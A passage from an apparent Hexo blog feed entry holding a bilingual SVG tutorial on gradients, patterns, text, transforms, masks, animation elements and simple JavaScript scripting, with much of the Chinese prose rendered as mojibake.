&lt;stop offset=&quot;50%&quot; stop-color=&quot;black&quot; stop-opacity=&quot;0.1&quot; /&gt;</span><br><span class="line">         &lt;stop offset=&quot;100%&quot; stop-color=&quot;blue&quot; /&gt;</span><br><span class="line">      &lt;/linearGradient&gt;</span><br><span class="line">  &lt;/defs&gt;</span><br><span class="line">  &lt;rect x=&quot;10&quot; y=&quot;10&quot; width=&quot;100&quot; height=&quot;100&quot; fill=&quot;url(#Gradient1)&quot;/&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure></li><li><p>å¾„å‘æ¸å˜<br>ä»ä¸€ä¸ªç‚¹å¼€å§‹å‘æ•£ç»˜åˆ¶æ¸å˜ã€‚<br><em>spreadMethod</em> : å½“æ¸å˜åˆ°è¾¾ç»ˆç‚¹ï¼Œä½†æ­¤æ—¶å°šæœªè¢«å¡«å……å®Œã€‚å¯ä»¥è®¾ç½®spreadMethod, <strong>pad</strong>æœ€ç»ˆçš„åç§»é¢œè‰²è¢«ç”¨äºå¡«å……å¯¹è±¡å‰©ä¸‹çš„ç©ºé—´ã€‚ <strong>reflect</strong>è®©æ¸å˜ä¸€ç›´æŒç»­ä¸‹å»ï¼Œä½†æ•ˆæœä¸æ¸å˜æœ¬èº«ç›¸åã€‚ <strong>repeat</strong>è·³å›æœ€åˆçš„é¢œè‰²ç„¶åç»§ç»­æ¸å˜ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;defs&gt;</span><br><span class="line">   &lt;radialGradient id=&quot;RadialGradient1&quot; cx=&quot;0.5&quot; cy=&quot;0.5&quot; r=&quot;0.25&quot; fx=&quot;0.25&quot; fy=&quot;0.25&quot; spreadMethod=&quot;repeat&quot;&gt;</span><br><span class="line">      &lt;stop offset=&quot;0%&quot; stop-color=&quot;red&quot; /&gt;</span><br><span class="line">      &lt;stop offset=&quot;100%&quot; stop-color=&quot;blue&quot; /&gt;</span><br><span class="line">   &lt;/radialGradient&gt;</span><br><span class="line">&lt;/defs&gt;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><ul><li>å›¾æ¡ˆ<br><em><code>&lt;pattern&gt;</code></em> éœ€è¦æ”¾åœ¨SVGæ–‡æ¡£çš„defså†…éƒ¨ã€‚patternå®šä¹‰äº†ä¸€ä¸ªå•å…ƒç³»ç»Ÿï¼Œåœ¨patternå…ƒç´ å†…ä½ å¯ä»¥åŒ…å«ä»»ä½•åŸºæœ¬å½¢çŠ¶ã€‚<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;defs&gt;</span><br><span class="line">  &lt;pattern id=&quot;Pattern&quot; x=&quot;0&quot; y=&quot;0&quot; width=&quot;0.25&quot; height=&quot;0.25&quot;&gt;</span><br><span class="line">      &lt;rect x=&quot;0&quot; y=&quot;0&quot; width=&quot;50&quot; height=&quot;50&quot; fill=&quot;blue&quot;/&gt;</span><br><span class="line">      &lt;rect x=&quot;0&quot; y=&quot;0&quot; width=&quot;25&quot; height=&quot;25&quot; fill=&quot;url(#Gradient1)&quot;&gt;</span><br><span class="line">  &lt;/pattern&gt;</span><br><span class="line">&lt;/defs&gt;</span><br><span class="line">&lt;rect fill=&quot;url(#Pattern)&quot; stroke=&quot;black&quot; x=&quot;0&quot; y=&quot;0&quot; width=&quot;100&quot; height=&quot;100&quot;&gt;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="6-æ–‡æœ¬"><a href="#6-æ–‡æœ¬" class="headerlink" title="6. æ–‡æœ¬"></a>6. æ–‡æœ¬</h3><p><em><code>&lt;text&gt;å±æ€§</code></em><br>(x,y)ä½ç½®, text-anchor(æ–‡æœ¬æµçš„æ–¹å‘):start/middle/end/inherit, fill, stroke, font-family, font-style, font-weight, font-variant, font-stretch, font-size, font-size-adjust, kerning, letter-spacing, word-spacing, text-decorationã€‚</p><p><em><code>&lt;tspan&gt;å±æ€§</code></em><br>(x,y), (dx,dy), rotate(æ‰€æœ‰å­—ç¬¦æ—‹è½¬ä¸€ä¸ªè§’åº¦), textLength, </p><p><em><code>&lt;tref&gt;å…ƒç´ </code></em><br>å…è®¸å¼•ç”¨å·²ç»å®šä¹‰çš„æ–‡æœ¬ï¼Œä½¿ç”¨<code>xlink:href</code>å±æ€§ï¼ŒæŠŠå®ƒæŒ‡å‘ä¸€ä¸ªå…ƒç´ ï¼Œå–å¾—å…¶æ–‡æœ¬å†…å®¹ã€‚</p><p><em><code>&lt;textPath&gt;å…ƒç´ </code></em><br>åˆ©ç”¨<code>xlink:href</code>å±æ€§å–å¾—ä¸€ä¸ªä»»æ„è·¯å¾„ï¼Œå­—ä½“ä¼šç¯ç»•è·¯å¾„èµ°ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;text id=&quot;example&quot;&gt;This is an example&lt;/text&gt;</span><br><span class="line">&lt;path id=&quot;my_path&quot; d=&quot;M 20,20 C 40,40 80,40 100,20&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;text x=&quot;10&quot; y=&quot;10&quot;&gt;</span><br><span class="line">   &lt;tspan font-weight=&quot;bold&quot; fill=&quot;red&quot;&gt;Hello&lt;/tspan&gt;</span><br><span class="line">   &lt;tref xlink:href=&quot;#example&quot;/&gt;</span><br><span class="line">   &lt;textPath xlink:href=&quot;#my_path&quot;&gt;Hello&lt;/textPath&gt;</span><br><span class="line">&lt;/text&gt;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="7-å˜å½¢-å‰ªåˆ‡-é®ç½©"><a href="#7-å˜å½¢-å‰ªåˆ‡-é®ç½©" class="headerlink" title="7. å˜å½¢,å‰ªåˆ‡,é®ç½©"></a>7. å˜å½¢,å‰ªåˆ‡,é®ç½©</h3><ul><li><p>å˜å½¢ </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;rect x=&quot;0&quot; y=&quot;0&quot; width=&quot;10&quot; height=&quot;10&quot; transform=&quot;translate(30,40)&quot;&gt;</span><br><span class="line">translate(30,40)     // å¹³ç§»: æŠŠçŸ©å½¢ç§»åŠ¨åˆ°ç‚¹(30,40)</span><br><span class="line">rotate(45)           // æ—‹è½¬: æŒ‡å®šæ—‹è½¬è§’åº¦æ•°</span><br><span class="line">skewX(40)ã€skewY(40) // æ–œåˆ‡: åˆ¶ä½œä¸€ä¸ªæ–œè±å½¢ </span><br><span class="line">scale(0.5)           // ç¼©æ”¾</span><br></pre></td></tr></table></figure></li><li><p>å‰ªåˆ‡<br><code>&lt;clipPath&gt;</code>æ“¦é™¤å·²ç»åˆ›å»ºçš„å…ƒç´ çš„éƒ¨åˆ†å†…å®¹ï¼Œå¦‚ç»˜åˆ¶åŠåœ†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;defs&gt;</span><br><span class="line">   &lt;clipPath id=&quot;cut-off-bottom&quot;&gt;</span><br><span class="line">      &lt;rect x=&quot;0&quot; y=&quot;0&quot; width=&quot;200&quot; height=&quot;100&quot; /&gt;</span><br><span class="line">   &lt;/clipPath&gt;</span><br><span class="line">&lt;/defs&gt;</span><br><span class="line">&lt;circle cx=&quot;100&quot; cy=&quot;100&quot; r=&quot;100&quot; clip-path=&quot;url(#cut-off-bottom)&quot; /&gt;</span><br></pre></td></tr></table></figure></li><li><p>é®ç½©</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;defs&gt;</span><br><span class="line">   &lt;mask id=&quot;Mask&quot;&gt;</span><br><span class="line">      &lt;rect x=&quot;0&quot; y=&quot;0&quot; width=&quot;100&quot; height=&quot;100&quot; fill=&quot;url(#Gradient1)&quot;&gt;</span><br><span class="line">   &lt;/mask&gt;</span><br><span class="line">&lt;/defs&gt;</span><br><span class="line">&lt;rect x=&quot;0&quot; y=&quot;0&quot; width=&quot;100&quot; height=&quot;100&quot; mask=&quot;url(#Mask)&quot;&gt;</span><br></pre></td></tr></table></figure></li><li><p>åµŒå…¥å›¾åƒ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;image x=&quot;0&quot; y=&quot;0&quot; width=&quot;10&quot; height=&quot;10&quot; transform=&quot;rotate(45)&quot; xlink:href=&quot;1.png&quot;/&gt;</span><br></pre></td></tr></table></figure></li><li><p>å¯åµŒå…¥ä»»æ„XML<br><br></p></li></ul><h3 id="8-åŠ¨ç”»"><a href="#8-åŠ¨ç”»" class="headerlink" title="8. åŠ¨ç”»"></a>8. åŠ¨ç”»</h3><svg xmlns="http://www.w3.org/2000/svg">    <rect x="10" y="10" height="110" width="110" style="fill: #0000ff"/>        <animatetransform attributename="transform" begin="0s" dur="20s" type="rotate" from="0 60 60" to="360 60 60" repeatcount="indefinite">    </animatetransform></svg><p><br></p><h3 id="9-SVG-Animation"><a href="#9-SVG-Animation" class="headerlink" title="9. SVG Animation"></a>9. SVG Animation</h3><p>Animation is done by manipulating the attributes of shapes over time. This is done using one or more of the 5 SVG animation elements:<code>&lt;set&gt; &lt;animate&gt; &lt;animateColor&gt; &lt;animateTransform&gt; &lt;animateMotion&gt;</code></p><ul><li><p><em><code>&lt;set&gt;</code></em><br>The shape is not continuously animating, but just changes attribute attribute value once after a specific time. The example above sets the attribute <code>r</code> to 100 after 5 seconds.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg width=&quot;500&quot; height=&quot;100&quot; version=&quot;1.1&quot;&gt;</span><br><span class="line">  &lt;circle cx=&quot;30&quot; cy=&quot;30&quot; r=&quot;25&quot; style=&quot;fill: #0000ff;&quot;&gt;</span><br><span class="line">    &lt;set attributeName=&quot;r&quot; attributeType=&quot;XML&quot; to=&quot;100&quot; begin=&quot;5s&quot;/&gt;</span><br><span class="line">  &lt;/circle&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure></li><li><p><em><code>&lt;animate&gt;</code></em><br>The <code>animate</code> element is used to animate an attribute of an SVG shape. You nest the <code>animate</code> element inside the shape you want it applied to.<br>This example animate the <code>cx</code> attribute of the <code>&lt;circle&gt;</code> element from a value of 30 to the value of 470. The animation starts at 0 seconds, and has a duration of 5 seconds. The animation repeats indefinitely.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;circle cx=&quot;30&quot; cy=&quot;30&quot; r=&quot;25&quot; style=&quot;stroke: none; fill: #0000ff;&quot;&gt;</span><br><span class="line">  &lt;animate attributeName=&quot;cx&quot; attributeType=&quot;XML&quot;</span><br><span class="line">    from=&quot;30&quot;  to=&quot;470&quot;</span><br><span class="line">    begin=&quot;0s&quot; dur=&quot;5s&quot;</span><br><span class="line">    fill=&quot;remove&quot; repeatCount=&quot;indefinite&quot;</span><br><span class="line">  /&gt;</span><br><span class="line">&lt;/circle&gt;</span><br></pre></td></tr></table></figure></li><li><p><em><code>&lt;animateTransform&gt;</code></em><br>The <code>&lt;animateTransform&gt;</code> element can animate the <code>transform</code> attribute of a shape.<br>The example animates the <code>transform</code> attribute of the <code>&lt;rect&gt;</code> element it is nested inside. The <code>type</code> attribute is set to <code>rotate</code> meaning the animated transformation will be a rotation. The <code>from</code> and <code>to</code> attributes set the parameters to be animated and passed to <code>rotate</code> function. This example rotates from a degree of 0 to a degree of 360 around point 5,5.<br><br></p></li></ul><svg width="50" height="50">  <rect x="10" y="10" width="10" height="10" style="stroke: #ff00ff; fill:none;"/>    <animatetransform attributename="transform" type="rotate" from="0 5 5" to="360 5 5" begin="0s" dur="10s" repeatcount="indefinite">  </animatetransform></svg><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;rect x=&quot;10&quot; y=&quot;10&quot; width=&quot;10&quot; height=&quot;10&quot;</span><br><span class="line">    style=&quot;stroke: #ff00ff; fill:none;&quot; &gt;</span><br><span class="line">  &lt;animateTransform attributeName=&quot;transform&quot;</span><br><span class="line">    type=&quot;rotate&quot;</span><br><span class="line">    from=&quot;0 5 5&quot; to=&quot;360 5 5&quot;</span><br><span class="line">    begin=&quot;0s&quot; dur=&quot;10s&quot;</span><br><span class="line">    repeatCount=&quot;indefinite&quot;</span><br><span class="line">  /&gt;</span><br><span class="line">&lt;/rect&gt;</span><br><span class="line"></span><br><span class="line">&lt;rect x=&quot;20&quot; y=&quot;20&quot; width=&quot;40&quot; height=&quot;40&quot; style=&quot;stroke: #ff00ff; fill: none;&quot; &gt;</span><br><span class="line">    &lt;animateTransform attributeName=&quot;transform&quot;</span><br><span class="line">      type=&quot;scale&quot;</span><br><span class="line">      from=&quot;1 1&quot; to=&quot;2 3&quot;</span><br><span class="line">      begin=&quot;0s&quot; dur=&quot;10s&quot;</span><br><span class="line">      repeatCount=&quot;indefinite&quot;</span><br><span class="line">    /&gt;</span><br><span class="line">&lt;/rect&gt;</span><br></pre></td></tr></table></figure><p><br></p><ul><li><em><code>&lt;animateMotion&gt;</code></em><br>The <code>&lt;animateMotion&gt;</code> element can animate the movement of a shape along a path.<br>In order to rotate the square to align with the slope of the path, you can set the <code>rotate</code> attribute of the <code>&lt;animateMotion&gt;</code> element to <code>auto</code>. You can also set the <code>rotate</code> attribute to a specific value, like 20 or 30 etc. That will keep the shape rotated that number of degrees throughout the animation.<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg width=&quot;500&quot; height=&quot;100&quot; version=&quot;1.1&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;</span><br><span class="line">    &lt;rect x=&quot;0&quot; y=&quot;0&quot; width=&quot;30&quot; height=&quot;15&quot; style=&quot;stroke: #ff0000; fill: none;&quot;&gt;</span><br><span class="line">        &lt;animateMotion path=&quot;M10,50 q60,50 100,0 q60,-50 100,0&quot; begin=&quot;0s&quot; dur=&quot;10s&quot; repeatCount=&quot;indefinite&quot; rotate=&quot;auto&quot;/&gt;</span><br><span class="line">    &lt;/rect&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2018/11/06/SVGæ–‡æ¡£/1.jpeg" style="max-width: 380px"><br><br></p><ul><li><em>Time Units</em><br>h, min, s, ms, hh:mm:ss<br><br></li></ul><ul><li><em>Coordinating Animations</em><br>The <code>begin</code> attribute value is set to <code>one.end</code> which means that this animation should start when the animation with the id <code>one</code> ends. You can also specify offsets to start or end time of another animation, like <code>one.begin+10s</code>.<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;rect x=&quot;0&quot; y=&quot;0&quot; width=&quot;30&quot; height=&quot;15&quot; style=&quot;stroke: #ff0000; fill: none;&quot;&gt;</span><br><span class="line">  &lt;animate id=&quot;one&quot; attributeName=&quot;x&quot; attributeType=&quot;XML&quot;</span><br><span class="line">    from=&quot;0&quot; to=&quot;400&quot;</span><br><span class="line">    begin=&quot;0s&quot; dur=&quot;10s&quot; fill=&quot;freeze&quot;</span><br><span class="line">  /&gt;</span><br><span class="line">  &lt;animate attributeName=&quot;y&quot; attributeType=&quot;XML&quot;</span><br><span class="line">    from=&quot;0&quot; to=&quot;50&quot;</span><br><span class="line">    begin=&quot;one.end&quot; dur=&quot;10s&quot; fill=&quot;freeze&quot;</span><br><span class="line">    /&gt;</span><br><span class="line">&lt;/rect&gt;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><ul><li><em>Repeating Animations</em><br>There are two attributes you can use inside an animation element which are used to repeat the animation.<br>The first attribute is the <code>repeatCount</code> attribute. You can set a number of times, or the value <code>indefinite</code> which will keep the animation running without ever stopping.<br>The second attribute is the <code>repeatDur</code> which specifies a duration for which the animation is to be repeated.<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;animate attributeName=&quot;y&quot; attributeType=&quot;XML&quot;</span><br><span class="line">  from=&quot;0&quot; to=&quot;50&quot;</span><br><span class="line">  begin=&quot;one.end&quot; dur=&quot;10s&quot; fill=&quot;freeze&quot;</span><br><span class="line">  repeatCount=&quot;3&quot;</span><br><span class="line">  // repeatCount=&quot;indefinite&quot;</span><br><span class="line">  // repeatDur=&quot;30s&quot;</span><br><span class="line">  /&gt;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><ul><li><em>Combining Animations</em><br>You can combine animations by listing more than one <code>&lt;animation&gt;</code> inside the element to animate.<br>When combining <code>&lt;animateTransform&gt;</code> elements, the default behaviour is for the second animation to cancel out the first. Howeve, you can combine the transformation animations by add the attribute <code>additive</code> with a value of <code>sum</code> to both <code>&lt;animateTransform&gt;</code> elemens.<br>Here is an example which both scales and rotates a rectangle.<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;rect x=&quot;10&quot; y=&quot;10&quot; width=&quot;40&quot; height=&quot;20&quot; style=&quot;stroke: #000000; fill: none;&quot;&gt;</span><br><span class="line">    &lt;animateTransform attributeName=&quot;transform&quot; attributeType=&quot;XML&quot;</span><br><span class="line">      type=&quot;scale&quot;</span><br><span class="line">      from=&quot;1&quot; to=&quot;3&quot;</span><br><span class="line">      begin=&quot;0s&quot; dur=&quot;10s&quot;</span><br><span class="line">      repeatCount=&quot;indefinite&quot;</span><br><span class="line">      additive=&quot;sum&quot;</span><br><span class="line">  /&gt;</span><br><span class="line">    &lt;animateTransform attributeName=&quot;transform&quot; attributeType=&quot;XML&quot;</span><br><span class="line">      type=&quot;rotate&quot;</span><br><span class="line">      from=&quot;0 30 20&quot; to=&quot;360 30 20&quot;</span><br><span class="line">      begin=&quot;0s&quot; dur=&quot;10s&quot;</span><br><span class="line">      fill=&quot;freeze&quot;</span><br><span class="line">      repeatCount=&quot;indefinite&quot;</span><br><span class="line">      additive=&quot;sum&quot;</span><br><span class="line">  /&gt;</span><br><span class="line">&lt;/rect&gt;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="10-SVG-Scripting"><a href="#10-SVG-Scripting" class="headerlink" title="10. SVG Scripting"></a>10. SVG Scripting</h3><p>Via scripting you can modify the SVG elements, animate them, or listen for mouse events on the shapes.</p><h4 id="10-1-Changing-attribute-values"><a href="#10-1-Changing-attribute-values" class="headerlink" title="10.1 Changing attribute values"></a>10.1 Changing attribute values</h4><p>Here is a simple SVG scripting example which changes the dimensions of an SVG rectangle when a button is clicked.</p><svg width="500" height="100">    <rect id="rect1" x="10" y="10" width="50" height="80" style="stroke:#000000; fill:none;"/></svg><input id="button1" type="button" value="Change Dimensions" onclick="changeDimensions()"><script>  function changeDimensions() {    document.getElementById("rect1").setAttribute("width", "100");  }</script><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg width=&quot;500&quot; height=&quot;100&quot;&gt;</span><br><span class="line">    &lt;rect id=&quot;rect1&quot; x=&quot;10&quot; y=&quot;10&quot; width=&quot;50&quot; height=&quot;80&quot; style=&quot;stroke:#000000; fill:none;&quot;/&gt;</span><br><span class="line">&lt;/svg&gt;</span><br><span class="line">&lt;input id=&quot;button1&quot; type=&quot;button&quot; value=&quot;Change Dimensions&quot; onclick=&quot;changeDimensions()&quot;/&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  function changeDimensions() &#123;</span><br><span class="line">    var svgElement = document.getElementById(&quot;rect1&quot;);</span><br><span class="line">    var width = svgElement.getAttribute(&quot;width&quot;);</span><br><span class="line">    svgElement.setAttribute(&quot;width&quot;, &quot;100&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="10-2-Event-Listeners"><a href="#10-2-Event-Listeners" class="headerlink" title="10.2 Event Listeners"></a>10.2 Event Listeners</h4><p>You can add event listeners to an SVG shape directly in the SVG if you want. You do so just like you would with an HTML element. You can also attach an event listener to an SVG element using the <code>addEventListener()</code> function.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;rect x=&quot;10&quot; y=&quot;10&quot; width=&quot;100&quot; height=&quot;75&quot; style=&quot;stroke: #000000; fill: #eeeeee;&quot;</span><br><span class="line">  onmouseover=&quot;this.style.stroke = &apos;#ff0000&apos;; this.style[&apos;stroke-width&apos;] = 5;&quot;</span><br><span class="line">  onmouseout=&quot;this.style.stroke = &apos;#000000&apos;; this.style[&apos;stroke-width&apos;] = 1;&quot;</span><br><span class="line">/&gt;</span><br></pre></td></tr></table></figure></p><svg width="500" height="100">  <rect x="10" y="10" width="100" height="75" style="stroke: #000000; fill: #eeeeee;" onmouseover="this.style.stroke = '#ff0000'; this.style['stroke-width'] = 5;" onmouseout="this.style.stroke = '#000000'; this.style['stroke-width'] = 1;"/> </svg><p><br></p><h4 id="10-3-Animating-SVG-Shapes"><a href="#10-3-Animating-SVG-Shapes" class="headerlink" title="10.3 Animating SVG Shapes"></a>10.3 Animating SVG Shapes</h4><p>In order to animate an SVG shape you need to call a Javascript function repeatedly. The function changes the position or dimensions of a shape.<br><svg width="500" height="100">    <circle id="circle1" cx="20" cy="20" r="10" style="stroke: none; fill: #ff0000;"/></svg><script>    var timerFunction = null;    function startAnimation() {        if(timerFunction == null) {            timerFunction = setInterval(animate, 20);        }    }    function stopAnimation() {        if(timerFunction != null){            clearInterval(timerFunction);            timerFunction = null;        }    }    function animate() {        var circle = document.getElementById("circle1");        var x = circle.getAttribute("cx");        var newX = 2 + parseInt(x);        if(newX > 500) {            newX = 20;        }        circle.setAttribute("cx", newX);    }</script><br><input type="button" value="Start Animation" onclick="startAnimation();"><input type="button" value="Stop Animation" onclick="stopAnimation();"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">"500"</span> <span class="attr">height</span>=<span class="string">"100"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">circle</span> <span class="attr">id</span>=<span class="string">"circle1"</span> <span class="attr">cx</span>=<span class="string">"20"</span> <span class="attr">cy</span>=<span class="string">"20"</span> <span class="attr">r</span>=<span class="string">"10"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">style</span>=<span class="string">"stroke: none; fill: #ff0000;"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> timerFunction = <span class="literal">null</span>;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">startAnimation</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span>(timerFunction == <span class="literal">null</span>) &#123;</span></span><br><span class="line"><span class="undefined">            timerFunction = setInterval(animate, 20);</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">stopAnimation</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span>(timerFunction != <span class="literal">null</span>)&#123;</span></span><br><span class="line"><span class="undefined">            clearInterval(timerFunction);</span></span><br><span class="line"><span class="javascript">            timerFunction = <span class="literal">null</span>;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">animate</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> circle = <span class="built_in">document</span>.getElementById(<span class="string">"circle1"</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> x = circle.getAttribute(<span class="string">"cx"</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> newX = <span class="number">2</span> + <span class="built_in">parseInt</span>(x);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span>(newX &gt; <span class="number">500</span>) &#123;</span></span><br><span class="line"><span class="undefined">            newX = 20;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="javascript">        circle.setAttribute(<span class="string">"cx"</span>, newX);</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"Start Animation"</span> <span class="attr">onclick</span>=<span class="string">"startAnimation();"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"Stop Animation"</span> <span class="attr">onclick</span>=<span class="string">"stopAnimation();"</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/SVG/Tutorial" target="_blank" rel="noopener">MDN - SVGæ•™ç¨‹</a></li><li><a href="http://tutorials.jenkov.com/svg/svg-animation.html" target="_blank" rel="noopener">SVG Tutorial</a></li><li><a href="https://zhuanlan.zhihu.com/p/36031294" target="_blank" rel="noopener">SVG æµªå•Šï¼Œæµªæ¥äº†ï¼Œå¤§æµªæ¥äº†</a></li><li><a href="https://ant.design/components/icon-cn/" target="_blank" rel="noopener">Ant Design Icons</a></li></ul>]]></content>
      
      <categories>
          
          <category> HTML </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>DOM å¦‚ä½•ç”Ÿæˆï¼Ÿæä¾›äº†å“ªäº›APIï¼Ÿ</title>
      <link href="/2018/10/07/DOM/"/>
      <url>/2018/10/07/DOM/</url>
